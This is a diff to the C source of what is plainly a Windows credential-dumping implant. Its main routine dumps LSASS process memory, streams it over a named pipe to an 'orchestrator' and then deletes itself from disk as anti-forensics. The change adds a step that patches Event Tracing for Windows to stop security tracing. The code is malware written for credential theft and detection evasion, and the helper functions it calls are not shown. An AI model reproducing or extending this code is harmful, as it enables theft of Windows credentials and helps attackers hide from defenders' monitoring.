@@ -105,19 +105,22 @@ void main_entry(void) {
         ExitProcess(2);
     }
 
-    // Step 2: Create named pipe and wait for orchestrator
+    // Step 2: Patch ETW to prevent tracing
+    patch_etw();
+
+    // Step 3: Create named pipe and wait for orchestrator
     HANDLE pipe = open_named_pipe(pipe_name);
     if (!pipe) {
         ExitProcess(3);
     }
 
-    // Step 3: Dump LSASS and stream through pipe
+    // Step 4: Dump LSASS and stream through pipe
     BOOL success = dump_lsass(pid, pipe);
 
-    // Step 4: Cleanup
+    // Step 5: Cleanup
     close_pipe(pipe);
 
-    // Step 5: Self-delete from disk (anti-forensics)
+    // Step 6: Self-delete from disk (anti-forensics)
     self_delete();
 
     ExitProcess(success ? 0 : 4);
